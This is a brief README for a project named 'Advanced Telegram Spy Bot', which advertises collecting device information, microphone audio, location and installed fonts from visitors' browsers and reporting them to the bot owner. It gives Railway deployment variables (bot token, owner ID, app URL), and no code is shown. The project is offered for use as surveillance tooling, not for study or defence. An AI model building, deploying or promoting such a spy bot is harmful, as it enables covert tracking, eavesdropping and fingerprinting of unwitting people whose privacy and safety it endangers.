# Advanced Telegram Spy Bot (max device info + mic + location + fonts)

## Environment Variables on Railway (no .env file needed)
- `BOT_TOKEN` = from BotFather
- `BOT_OWNER_ID` = your Telegram numeric ID
- `BASE_URL` = your Railway app URL (e.g., `https://your-app.up.railway.app`)

All other data is collected client-side with browser permissions.
